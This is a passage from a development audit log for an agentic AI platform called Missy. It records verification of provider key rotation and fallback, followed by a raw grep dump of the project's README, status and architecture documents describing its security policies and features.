    on one.
  - Fallback candidates are filtered to `get_available()` minus the
    failed provider, minus any candidate whose own `CircuitBreaker` is
    already `OPEN` (still cooling down from an earlier failure), then —
    when the call requires tool-calling — sorted to prefer a candidate
    that overrides `complete_with_tools` over one that only inherits
    `BaseProvider`'s default degrade-to-`complete()` implementation; if
    no tool-capable candidate exists, the audit event records
    `tool_compatibility_degraded: true` so the operator can see
    capability was honestly lost, rather than silently downgrading.
  - The fallback provider's message list is rebuilt fresh
    (`_dicts_to_native_messages` vs. `_dicts_to_messages`, matching
    *that* candidate's own `accepts_message_dicts` convention) rather
    than reusing whatever was built for the original provider —
    transcript integrity across the transition, live-verified: a
    fallback provider with `accepts_message_dicts=True` receives
    `list[dict]` while the primary (without that flag) would have
    received `list[Message]`, and the semantic content (e.g. the exact
    user text) is preserved through the reformat.
  - `self.config.model` (a model id on the *originally configured*
    provider) is only forwarded to that same provider; a fallback
    candidate always uses its own configured default model instead —
    live-verified via `received_model is None` on the fallback,
    preventing the fallback API from being asked for a model name it
    has never heard of.
  - Every transition — `agent.provider.call_failed`,
    `agent.provider.key_rotated`, `agent.provider.fallback` — is a
    redacted audit event via the existing `_emit_event()` →
    `event_bus.publish()` → `AuditLogger`'s `_redact_detail()` pipeline
    (same mechanism as SR-1.10/SR-4.6, reused rather than
    reimplemented) — live-verified end-to-end through a real
    `AuditLogger` writing to a temp JSONL file: a fabricated
    secret-shaped string embedded in a provider's error message never
    reached disk unredacted.
  - Tool dispatch after a mid-loop provider swap is unaffected: a tool
    call proposed by a *fallback* provider still goes through SR-2.3's
    existing `allowed_tool_names` gate at `_execute_tool()` dispatch
    time, live-verified with a fallback provider engineered to request
    a tool name outside the turn's allowed set — denied identically to
    a request from the originally configured provider, since dispatch
    never looks at which provider proposed the call.
  - When every candidate (primary, post-rotation retry, and all
    fallbacks) fails, the last real exception is re-raised — fails
    closed, matching the existing "no providers available" doctrine in
    `_get_provider()` rather than fabricating a success.
- **Verification:** new `tests/providers/test_provider_health.py` (13
  tests, `classify_provider_error()` against every marker + case-
  sensitivity + precedence), 4 new tests in
  `tests/providers/test_registry_deep.py` (`key_for()`), and new
  `tests/agent/test_provider_fallback.py` (12 tests) against real
  `BaseProvider` subclasses (not `MagicMock(spec=...)`) registered in a
  real `ProviderRegistry` — covering key rotation (retries + skips
  correctly by failure class), cross-provider fallback (model
  isolation, transcript reformatting), tool-compatibility ordering
  (including the degraded-audit-event case), budget gating, cooldown/
  circuit-breaker eligibility exclusion, all-candidates-exhausted
  fail-closed behavior, end-to-end audit redaction through a real
  `AuditLogger`, and SR-2.3 tool-policy preservation across a mid-loop
  swap. `tests/agent/` + `tests/providers/` (5,128 tests) and
  `tests/cli/` + `tests/api/` + `tests/integration/` +
  `tests/scheduler/` + `tests/mcp/` (2,463 tests) pass with no
  regressions. Full suite result recorded in `TEST_RESULTS.md`.
- **Residual risk:** `ModelRouter`/`score_complexity()`/`select_model()`
  remain intentionally unwired dead code — this checkpoint was scoped
  to rotation/fallback (the literal SR-4.8 review text: "Trace
  API-key/profile rotation and cross-provider fallback"), not to
  building the complexity-based tier-routing engine, which is a
  materially different feature (choosing a *cheaper* model
  proactively, not recovering from a *failed* one) and was not part of
  the operator's chosen scope. `CLAUDE.md` and
  `docs/implementation/module-map.md` now say so explicitly rather than
  implying it works. The per-provider `CircuitBreaker` cooldown timers
  use the same fixed threshold/backoff defaults as the primary's
  breaker (`threshold=5, base_timeout=60s, max=300s` from
  `missy/agent/circuit_breaker.py`) — not yet tunable per-provider via
  config, a reasonable small follow-up if operators want, e.g., a
  faster cooldown for a known-flaky self-hosted Ollama endpoint than
  for a paid cloud provider. Rate-limit-classified failures never
  trigger key rotation by design (rotating credentials cannot fix a
  rate limit), but a provider with a *per-key* rate limit (rather than
  a per-account one) would actually benefit from rotation on
  `rate_limit` too — deliberately not implemented, since none of the
  built-in providers document per-key rate limits and doing so
  speculatively would be unverifiable without a live account
  exhibiting that behavior.

---

- Timestamp: 2026-07-09 15:35:26 (raw grep-scan dump below, preserved
  for history; unrelated to the curated findings above — note it was
  captured from a different working tree path, `~/missy-loops/missy/`,
  and largely covers the prior "tool intelligence" overhaul, not this
  session's work)

## Expected common security and operations docs
- present: README.md
- present: docs/security.md
- present: docs/operations.md
- present: docs/discord.md

## Security and tool-intelligence scan
```
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:7:- Added an opt-in controlled runtime loader for enabled tool candidates.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:8:- Added persisted candidate `implementation` metadata with SQLite migration.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:10:- Runtime loading is gated by `tool_intelligence.candidate_runtime.enabled`.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:11:- The loader only registers enabled candidates for the active provider when
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:12:  provenance, schema, permissions, provider flags, implementation type, and
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:15:  `{"type": "delegated_tool", "tool": "<registered_tool>"}`.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:16:- Loader allow/deny outcomes emit structured candidate audit events.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:20:- Added tests for loader allow/deny behavior, runtime opt-in wiring, config
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:21:  parsing, and candidate-store implementation persistence.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:26:python3 -m pytest tests/vision/test_frame_eviction_hardening.py::TestCaptureDeadlineAwareSleep tests/tools/test_candidate_loader.py tests/tools/test_candidate_store.py tests/agent/test_tool_intelligence_wiring.py tests/config/test_settings.py -q
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:49:- Runtime loader supports only `delegated_tool`; additional adapters need
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:50:  separate policy, sandboxing, provenance, test, and rollback gates.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:51:- Provider fallback recommendations exist in CLI/provider gate code but are
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:52:  not yet surfaced in runtime responses when a tool is gated off.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:53:- Candidate review can import schema-score aggregates, but provider-family
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:54:  schema compatibility reporting is still limited.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:59:Add safe CLI/API/operator controls for setting candidate implementation
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:60:metadata, starting with `delegated_tool`, with typed confirmations and audit
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:9:| A1 | Streaming subscription state machine | tested | Core module and focused tests added; lightly wired to `AgentRuntime.run_stream()`. Needs channel/tool-loop integration. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:10:| A2 | Layered tool policy pipeline | hardened | `missy/policy/tool_policy_pipeline.py` is wired into `AgentRuntime._get_tools()` for runtime capability profiles and config-backed provider/global/agent/sandbox/subagent policy surfaces. Channel/group policy sources remain future hardening. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:13:| A5 | Auth profile cooldown + fallback | not_started | Provider registry/rate limiter work remains. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:14:| A6 | Per-provider tool schema normalization | not_started | Schema adapter work remains. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:18:| A10 | Sub-agent depth + child caps | not_started | SubAgentRunner persistence/tool policy work remains. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:29:| H_C | Persistent personal memory | not_started | Memory schema/CLI remains. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:31:| H_E | Genuine disagreement and pushback | not_started | Prompt fragment and audit logging remain. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:41:- Updated `AgentRuntime.run_stream()` to pass provider chunks through `AgentSubscription`.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:45:- Session 2 added the A2 layered tool policy pipeline with profile bundles, group expansion, glob matching, inline `-tool` denies, `alsoAllow`, fail-warning unknown allowlists, and structured trace records.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:46:- Session 2 wired `AgentRuntime._get_tools()` to resolve tools through the pipeline and record `_last_tool_policy_decision` for audit/debugging.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:47:- Session 2 added `tests/policy/test_tool_policy_pipeline.py` and runtime coverage for policy decisions in `tests/agent/test_runtime_streaming.py`.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:48:- Session 3 added config parsing for `tools.*`, `tools.byProvider`, `tools.byModel`, `tools.groups`, `agents.<id>.tools`, `agents.<id>.subagents.tools`, and `sandbox.tools`.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:49:- Session 3 added `build_configured_tool_policy_layers()` and `collect_tool_policy_groups()` so runtime policy resolution now consumes YAML-backed provider/global/agent/sandbox/subagent layers.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:50:- Session 3 routed parsed tool policies into CLI-created runtimes for ask/run/gateway/API paths and documented the YAML surface in `docs/configuration.md`.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:51:- Session 3 added config, policy-pipeline, and runtime tests for those surfaces, then verified the full test suite and full-repo ruff.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:55:1. Harden A1 by routing provider/tool-loop stream events through `AgentSubscription` where Missy's providers expose stream events, not only the simple `run_stream()` path.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:56:2. Add the A7 `BlockChunker` and connect it to A1 flush points so pre-tool text can be delivered through Discord/CLI/Web in order.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:58:4. Add channel/group policy sources on top of the A2 pipeline when Discord/CLI/Web channel identity context is available.
/home/missy/missy-loops/missy/LOOP_HEALTH.md:5:- Branch: overhaul/tools-20260709-174109
/home/missy/missy-loops/missy/LOOP_HEALTH.md:6:- Primary focus: complete tool usage and tool intelligence overhaul
/home/missy/missy-loops/missy/README.md:5:Missy is a production-grade agentic platform that runs entirely on your hardware. Default-deny network, filesystem sandboxing, shell whitelisting, encrypted vault, and structured audit logging — every capability is locked down until you explicitly allow it. Connect any AI provider. Deploy voice nodes throughout your home. Automate with scheduled jobs. Extend with tools, skills, and plugins.
/home/missy/missy-loops/missy/README.md:13:Most AI assistants trust the network, trust the model, and trust the plugins. Missy trusts nothing by default.
/home/missy/missy-loops/missy/README.md:18:- **No plugins** unless you approve them individually
/home/missy/missy-loops/missy/README.md:19:- **Every action** logged as structured JSONL with full audit trail
/home/missy/missy-loops/missy/README.md:20:- **Every audit event** signed with the agent's Ed25519 identity
/home/missy/missy-loops/missy/README.md:29:- **Multi-provider** — Anthropic (Claude), OpenAI (GPT), Ollama (local models) with automatic fallback and runtime hot-swap (`missy providers switch`)
/home/missy/missy-loops/missy/README.md:30:- **API key rotation** — multiple keys per provider, round-robin distribution
/home/missy/missy-loops/missy/README.md:32:- **Agentic runtime** — tool-augmented loops with done-criteria verification, learnings extraction, and self-tuning prompt patches
/home/missy/missy-loops/missy/README.md:33:- **AI Playbook** — auto-captures successful tool patterns, injects proven approaches into context, auto-promotes patterns with 3+ successes to skill proposals
/home/missy/missy-loops/missy/README.md:34:- **Attention system** — 5 brain-inspired subsystems (alerting, orienting, sustained, selective, executive) that track urgency, extract topics, maintain focus, and prioritize tools
/home/missy/missy-loops/missy/README.md:39:- **Interactive approval TUI** — real-time Rich terminal prompt for policy-denied operations (allow once / deny / allow always)
/home/missy/missy-loops/missy/README.md:40:- **Circuit breaker** — automatic backoff on provider failures (threshold=5, exponential to 300s)
/home/missy/missy-loops/missy/README.md:45:- **Failure tracking** — per-tool consecutive failure counts with automatic strategy rotation
/home/missy/missy-loops/missy/README.md:48:- **Code evolution** — self-evolving code modification engine with approval workflow and git-backed rollback
/home/missy/missy-loops/missy/README.md:49:- **Structured output** — Pydantic schema enforcement on LLM responses with automatic retry
/home/missy/missy-loops/missy/README.md:56:- **Multi-layer policy engine** — network (CIDR + domain + host), filesystem (per-path R/W), shell (command whitelist), L7 REST (HTTP method + path per host)
/home/missy/missy-loops/missy/README.md:57:- **Network presets** — `presets: ["anthropic", "github"]` auto-expands to correct hosts/domains/CIDRs
/home/missy/missy-loops/missy/README.md:58:- **Gateway enforcement** — all HTTP flows through `PolicyHTTPClient` with DNS rebinding protection, redirect blocking, scheme restrictions, interactive approval
/home/missy/missy-loops/missy/README.md:60:- **Prompt drift detection** — SHA-256 hashes system prompts, detects tampering between tool loop iterations
/home/missy/missy-loops/missy/README.md:63:- **Agent identity** — Ed25519 keypair at `~/.missy/identity.pem`, signs audit events, JWK export
/home/missy/missy-loops/missy/README.md:64:- **Trust scoring** — 0-1000 reliability tracking per tool/provider/MCP server with threshold warnings
/home/missy/missy-loops/missy/README.md:65:- **Container sandbox** — optional Docker-based isolation for tool execution (`--network=none`, memory/CPU limits)
/home/missy/missy-loops/missy/README.md:66:- **Landlock LSM** — Linux kernel-level filesystem enforcement via Landlock syscalls, complementing userspace policy
/home/missy/missy-loops/missy/README.md:67:- **Security scanner** — `missy security scan` audits installation for permission issues, config hygiene, exposed secrets
/home/missy/missy-loops/missy/README.md:68:- **MCP digest pinning** — SHA-256 verification of tool manifests; mismatches refuse to load
/home/missy/missy-loops/missy/README.md:72:- **CLI** — interactive REPL and single-shot queries with Rich formatting, capability modes (full/safe-chat/no-tools)
/home/missy/missy-loops/missy/README.md:73:- **Discord** — full Gateway WebSocket API, slash commands (`/ask`, `/status`, `/model`), DM allowlist, guild/role policies, image analysis
/home/missy/missy-loops/missy/README.md:75:- **Voice** — WebSocket server for edge nodes, faster-whisper STT, Piper TTS, device registry with PBKDF2 auth
/home/missy/missy-loops/missy/README.md:80:- **MCP servers** — connect external tool servers via `~/.missy/mcp.json`, auto-restart, digest pinning
/home/missy/missy-loops/missy/README.md:81:- **SKILL.md discovery** — scan directories for cross-agent portable skill definitions (`missy skills scan`)
/home/missy/missy-loops/missy/README.md:82:- **Tools, skills, plugins** — three extension tiers with increasing isolation and permission requirements
/home/missy/missy-loops/missy/README.md:85:- **Persona system** — YAML-backed agent identity/tone/style with backup, rollback, and audit logging
/home/missy/missy-loops/missy/README.md:93:- **Multi-provider** — Anthropic/OpenAI/Ollama image message formatting
/home/missy/missy-loops/missy/README.md:95:- **CLI tools** — `missy vision capture|inspect|review|doctor|health|benchmark|validate|memory`
/home/missy/missy-loops/missy/README.md:98:- **Browser tools** — Playwright-based Firefox automation (`pip install -e ".[desktop]"`)
/home/missy/missy-loops/missy/README.md:99:- **X11 tools** — window management and application launching
/home/missy/missy-loops/missy/README.md:100:- **Accessibility** — AT-SPI toolkit integration for GUI interaction
/home/missy/missy-loops/missy/README.md:103:- **Config presets** — `presets: ["anthropic", "github"]` replaces manual host lists
/home/missy/missy-loops/missy/README.md:106:- **Non-interactive setup** — `missy setup --provider anthropic --api-key-env ANTHROPIC_API_KEY --no-prompt`
/home/missy/missy-loops/missy/README.md:109:- **Audit logger** — every policy decision, provider call, and tool execution as JSONL, signed by agent identity
/home/missy/missy-loops/missy/README.md:110:- **Application logs** — rotating Python/provider diagnostics at `~/.missy/missy.log` (`missy logs tail`)
/home/missy/missy-loops/missy/README.md:130:The setup wizard walks you through configuring API keys, providers, network policy, and workspace paths. Once complete:
/home/missy/missy-loops/missy/README.md:152:missy setup --provider anthropic --api-key-env ANTHROPIC_API_KEY --no-prompt
/home/missy/missy-loops/missy/README.md:165:pip install -e ".[dev]"           # pytest, ruff, mypy, hypothesis, coverage tools
/home/missy/missy-loops/missy/README.md:182:(network,     (Anthropic, OpenAI,        (built-in tools,
/home/missy/missy-loops/missy/README.md:183: filesystem,   Ollama + fallback)         skills, plugins,
/home/missy/missy-loops/missy/README.md:199: Network ──► AuditLogger (signed) ──► ~/.missy/audit.jsonl
/home/missy/missy-loops/missy/README.md:205:Every outbound request — from providers, tools, plugins, MCP servers, Discord — passes through `PolicyHTTPClient`. No exceptions.
/home/missy/missy-loops/missy/README.md:217:  default_deny: true
/home/missy/missy-loops/missy/README.md:219:    - anthropic                  # auto-expands to api.anthropic.com + anthropic.com
/home/missy/missy-loops/missy/README.md:234:  enabled: false
/home/missy/missy-loops/missy/README.md:237:providers:
/home/missy/missy-loops/missy/README.md:238:  anthropic:
/home/missy/missy-loops/missy/README.md:239:    name: anthropic
/home/missy/missy-loops/missy/README.md:246:  enabled: false
/home/missy/missy-loops/missy/README.md:267:missy setup --no-prompt             # Non-interactive (--provider, --api-key-env, --model)
/home/missy/missy-loops/missy/README.md:268:missy ask PROMPT                    # Single-turn query (--provider, --session, --mode)
/home/missy/missy-loops/missy/README.md:269:missy run                           # Interactive REPL (--provider, --mode)
/home/missy/missy-loops/missy/README.md:270:missy providers list                # List providers and availability
/home/missy/missy-loops/missy/README.md:271:missy providers switch NAME         # Hot-swap active provider
/home/missy/missy-loops/missy/README.md:273:missy plugins                       # List plugins and their status
/home/missy/missy-loops/missy/README.md:279:# Security & audit
/home/missy/missy-loops/missy/README.md:280:missy audit recent                  # Recent events (--limit, --category)
/home/missy/missy-loops/missy/README.md:281:missy audit security                # Policy violations
/home/missy/missy-loops/missy/README.md:283:missy approvals list                # Pending human-in-the-loop approval requests
/home/missy/missy-loops/missy/README.md:297:missy discord status | probe | register-commands | audit
/home/missy/missy-loops/missy/README.md:301:missy devices list | pair | unpair | status | policy
/home/missy/missy-loops/missy/README.md:303:# MCP & skills
/home/missy/missy-loops/missy/README.md:305:missy skills                        # List registered skills
/home/missy/missy-loops/missy/README.md:306:missy skills scan                   # Discover SKILL.md files
/home/missy/missy-loops/missy/README.md:310:missy vision health | benchmark | validate | memory
/home/missy/missy-loops/missy/README.md:352:missy devices policy ID --mode full|safe-chat|muted
/home/missy/missy-loops/missy/README.md:362:python3 -m pytest tests/ -k "test_policy" -v         # Filter by name
/home/missy/missy-loops/missy/README.md:379:| [Configuration](https://missylabs.github.io/configuration/) | 7 | Full YAML reference, network/fs/shell policy, presets, providers |
/home/missy/missy-loops/missy/README.md:382:| [CLI Reference](https://missylabs.github.io/cli/) | 20 | Every command group, including gateway, discord, approvals, patches, sandbox, sessions |
/home/missy/missy-loops/missy/README.md:384:| [Providers](https://missylabs.github.io/providers/) | 5 | Anthropic, OpenAI, Ollama, runtime switching |
/home/missy/missy-loops/missy/README.md:385:| [Extending](https://missylabs.github.io/extending/) | 4 | Tools, plugins, MCP servers, SKILL.md |
/home/missy/missy-loops/missy/README.md:392:Developer-facing references in [`docs/`](docs/) — architecture, implementation deep-dives, persistence schema, module map.
/home/missy/missy-loops/missy/README.md:401:│                    attention, progress, approval, persona, behavior, hatching,
/home/missy/missy-loops/missy/README.md:412:├── policy/          Network, filesystem, shell, REST L7 policy engines + presets
/home/missy/missy-loops/missy/README.md:413:├── providers/       Anthropic, OpenAI, Ollama + registry with fallback & hot-swap
/home/missy/missy-loops/missy/README.md:414:├── scheduler/       APScheduler integration, human schedule parser
/home/missy/missy-loops/missy/README.md:417:├── skills/          Skill registry + SKILL.md discovery
/home/missy/missy-loops/missy/README.md:418:├── plugins/         Security-gated external plugin loader
/home/missy/missy-loops/missy/README.md:419:├── tools/           Built-in tools + registry (18+ tools)
/home/missy/missy-loops/missy/missy/tools/__init__.py:1:"""Missy tools framework — tool registry, base class, and built-in tools."""
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:9:- Mock LLM/provider calls. Behavioral tests should assert prompt fragments, state transitions, audit entries, cooldown decisions, or emitted channel timing calls.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:10:- Keep security and reliability separate from style: humanistic behaviors must not bypass policy, mutate tool results, or hide errors.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:22:  - Block flush at `text_end` and before tool execution.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:27:- A2 policy coverage: `tests/policy/test_tool_policy_pipeline.py`
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:29:  - Glob allow rules and inline `-tool` deny syntax compose in one layer.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:30:  - `alsoAllow` can restore matching tools after a restrictive layer.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:31:  - Unknown plugin-only allowlists warn without hiding core tools.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:32:  - Standard profile → provider → global → agent → group → sandbox → subagent layer ordering records trace labels.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:33:  - Config-backed provider/global/agent/sandbox/subagent layers preserve ordering and source labels.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:34:  - Custom `tools.groups` definitions extend the built-in group map.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:37:  - `tools.*`, `tools.byProvider`, nested `byModel`, `tools.groups`, `agents.<id>.tools`, `agents.<id>.subagents.tools`, and `sandbox.tools` parse from YAML.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:38:  - Invalid tool profiles fail with a configuration error.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:40:  - `AgentRuntime._get_tools()` records a `ToolPolicyDecision` and filters `safe-chat` through the A2 profile layer.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:42:  - `AgentRuntime._get_tools()` consumes config-backed global and agent policy surfaces.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:54:| H_G | Apology appears for a tool failure once; gratitude and hedging do not duplicate in the same exchange. |
/home/missy/missy-loops/missy/HATCHING.md:17:3. **Verify Providers** — Checks for API keys (env vars or config) for at least one AI provider
/home/missy/missy-loops/missy/HATCHING.md:46:  - verify_providers
/home/missy/missy-loops/missy/HATCHING.md:51:persona_generated: true
/home/missy/missy-loops/missy/HATCHING.md:53:provider_verified: true
/home/missy/missy-loops/missy/HATCHING.md:78:The hatching system is checked during `missy run` and `missy ask`. If Missy has not been hatched, users are prompted to run `missy hatch` first. The persona generated during hatching is loaded by the agent runtime to shape all subsequent responses.
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:7:- default-deny network where practical
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:8:- exact provider endpoints
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:9:- exact benchmark and provider endpoints
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:15:- `delegated_tool` candidates inherit the permissions and policy checks of the
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:17:- Candidates that request network permission must still pass normal tool
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:18:  registry and policy-engine checks before execution.
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:19:- No provider, Discord, plugin, MCP, benchmark, or external HTTP allowlist was
/home/missy/missy-loops/missy/docs/architecture.md:10:Missy is a **security-first**, **local-first**, **multi-provider** AI agent
/home/missy/missy-loops/missy/docs/architecture.md:13:access, filesystem writes, shell execution, plugin loading -- is disabled by
/home/missy/missy-loops/missy/docs/architecture.md:14:default and must be explicitly enabled through a YAML configuration file.
/home/missy/missy-loops/missy/docs/architecture.md:22:   policy engine before any bytes leave the machine.
/home/missy/missy-loops/missy/docs/architecture.md:23:3. **Audit everything** -- every policy decision, provider call, scheduler
/home/missy/missy-loops/missy/docs/architecture.md:24:   execution, and plugin action is recorded as a structured JSONL event.
/home/missy/missy-loops/missy/docs/architecture.md:34:  policy/          Network, filesystem, shell, REST L7 policy engines + presets
/home/missy/missy-loops/missy/docs/architecture.md:37:                   attention, progress, approval, persona, behavior, hatching,
/home/missy/missy-loops/missy/docs/architecture.md:41:  providers/       BaseProvider ABC, Anthropic, OpenAI, Ollama, registry + rate limiter
/home/missy/missy-loops/missy/docs/architecture.md:42:  tools/           Tool base class, registry, 18+ built-in tools
/home/missy/missy-loops/missy/docs/architecture.md:43:  skills/          Skill registry + SKILL.md discovery
/home/missy/missy-loops/missy/docs/architecture.md:44:  plugins/         Security-gated external plugin loader and base class
/home/missy/missy-loops/missy/docs/architecture.md:45:  scheduler/       APScheduler integration, human schedule parsing, job persistence
/home/missy/missy-loops/missy/docs/architecture.md:67: 3. Subsystem init        init_policy_engine(cfg)  -- network, filesystem, shell, REST L7
/home/missy/missy-loops/missy/docs/architecture.md:68:        |                 init_audit_logger(cfg.audit_log_path) + AgentIdentity (Ed25519)
/home/missy/missy-loops/missy/docs/architecture.md:69:        |                 init_registry(cfg) -- providers with rate limiter + fallback
/home/missy/missy-loops/missy/docs/architecture.md:71:        |                 init_tool_registry() -- 18+ built-in tools + MCP servers
/home/missy/missy-loops/missy/docs/architecture.md:78:        |                 Resolve provider (with fallback + circuit breaker)
/home/missy/missy-loops/missy/docs/architecture.md:82:        |                 Playbook injects proven tool patterns
/home/missy/missy-loops/missy/docs/architecture.md:85:        |                 All HTTP through PolicyHTTPClient -> policy + REST check
/home/missy/missy-loops/missy/docs/architecture.md:93: 8. Post-processing       Learnings extracted from tool-augmented runs
/home/missy/missy-loops/missy/docs/architecture.md:99:        |                 Events signed by AgentIdentity, appended to audit.jsonl
/home/missy/missy-loops/missy/docs/architecture.md:161:Every policy dataclass defaults to the most restrictive posture:
/home/missy/missy-loops/missy/docs/architecture.md:163:- `NetworkPolicy.default_deny = True`
/home/missy/missy-loops/missy/docs/architecture.md:164:- `ShellPolicy.enabled = False`
/home/missy/missy-loops/missy/docs/architecture.md:165:- `PluginPolicy.enabled = False`
/home/missy/missy-loops/missy/docs/architecture.md:168:An operator must explicitly add entries to allowlists before any capability is
/home/missy/missy-loops/missy/docs/architecture.md:173:All outbound HTTP traffic -- whether initiated by a provider, a tool, a plugin,
/home/missy/missy-loops/missy/docs/architecture.md:177:`get_policy_engine().check_network(host)`.  If the host is not on an allowlist,
/home/missy/missy-loops/missy/docs/architecture.md:180:The Anthropic and OpenAI providers use their own SDKs for HTTP, but their API
/home/missy/missy-loops/missy/docs/architecture.md:181:hosts must still appear in `network.allowed_hosts` for the initial policy check
/home/missy/missy-loops/missy/docs/architecture.md:182:at the gateway layer.  The Ollama provider routes directly through
/home/missy/missy-loops/missy/docs/architecture.md:193:- `category` (one of: `network`, `filesystem`, `shell`, `plugin`, `scheduler`, `provider`, `security`, `agent`, `tool`, `mcp`, `vision`)
/home/missy/missy-loops/missy/docs/architecture.md:194:- `result` (one of: `allow`, `deny`, `error`)
/home/missy/missy-loops/missy/docs/architecture.md:196:- `policy_rule` (optional rule name)
/home/missy/missy-loops/missy/docs/architecture.md:198:The `AuditLogger` (`missy/observability/audit_logger.py`) wraps the bus's
/home/missy/missy-loops/missy/docs/architecture.md:200:audit log file.
/home/missy/missy-loops/missy/docs/architecture.md:212:  +-> policy/engine
/home/missy/missy-loops/missy/docs/architecture.md:213:  +-> observability/audit_logger + observability/otel
/home/missy/missy-loops/missy/docs/architecture.md:214:  +-> providers/registry
/home/missy/missy-loops/missy/docs/architecture.md:216:  +-> scheduler/manager
/home/missy/missy-loops/missy/docs/architecture.md:217:  +-> plugins/loader
/home/missy/missy-loops/missy/docs/architecture.md:226:  +-> providers/registry + providers/base
/home/missy/missy-loops/missy/docs/architecture.md:228:  +-> tools/registry
/home/missy/missy-loops/missy/docs/architecture.md:232:  +-> agent/progress + agent/interactive_approval + agent/approval
/home/missy/missy-loops/missy/docs/architecture.md:240:providers/registry
/home/missy/missy-loops/missy/docs/architecture.md:241:  +-> providers/base
/home/missy/missy-loops/missy/docs/architecture.md:242:  +-> providers/anthropic_provider + openai_provider + ollama_provider
/home/missy/missy-loops/missy/docs/architecture.md:243:  +-> providers/rate_limiter
/home/missy/missy-loops/missy/docs/architecture.md:247:  +-> policy/engine + policy/rest_policy
/home/missy/missy-loops/missy/docs/architecture.md:248:  +-> agent/interactive_approval
/home/missy/missy-loops/missy/docs/architecture.md:251:policy/engine
/home/missy/missy-loops/missy/docs/architecture.md:252:  +-> policy/network + policy/filesystem + policy/shell + policy/rest_policy
/home/missy/missy-loops/missy/docs/architecture.md:253:  +-> policy/presets
/home/missy/missy-loops/missy/docs/architecture.md:259:  +-> tools/registry
/home/missy/missy-loops/missy/docs/architecture.md:265:scheduler/manager
/home/missy/missy-loops/missy/docs/architecture.md:266:  +-> scheduler/parser + scheduler/jobs
/home/missy/missy-loops/missy/docs/architecture.md:271:  +-> providers/base (for image formatting)
/home/missy/missy-loops/missy/docs/architecture.md:281:2. `init_policy_engine(cfg)` -- must come first; other subsystems depend on it
/home/missy/missy-loops/missy/docs/architecture.md:282:3. `init_audit_logger(cfg.audit_log_path)` -- wraps the event bus
/home/missy/missy-loops/missy/docs/architecture.md:283:4. `init_registry(cfg)` -- constructs provider instances
/home/missy/missy-loops/missy/docs/architecture.md:300:| Policy engine | `init_policy_engine(cfg)` | `get_policy_engine()` |
/home/missy/missy-loops/missy/docs/architecture.md:301:| Provider registry | `init_registry(cfg)` | `get_registry()` |
/home/missy/missy-loops/missy/docs/architecture.md:302:| Audit logger | `init_audit_logger(path)` | `get_audit_logger()` |
/home/missy/missy-loops/missy/docs/architecture.md:303:| Plugin loader | `init_plugin_loader(cfg)` | `get_plugin_loader()` |
/home/missy/missy-loops/missy/docs/architecture.md:304:| Skill registry | `init_skill_registry()` | `get_skill_registry()` |
/home/missy/missy-loops/missy/docs/architecture.md:305:| Tool registry | `init_tool_registry()` | `get_tool_registry()` |
/home/missy/missy-loops/missy/docs/README.md:9:| [Providers](providers.md) | Anthropic, OpenAI, Ollama setup and API key management |
/home/missy/missy-loops/missy/docs/README.md:11:| [Scheduler](scheduler.md) | Job scheduling with human-friendly syntax |
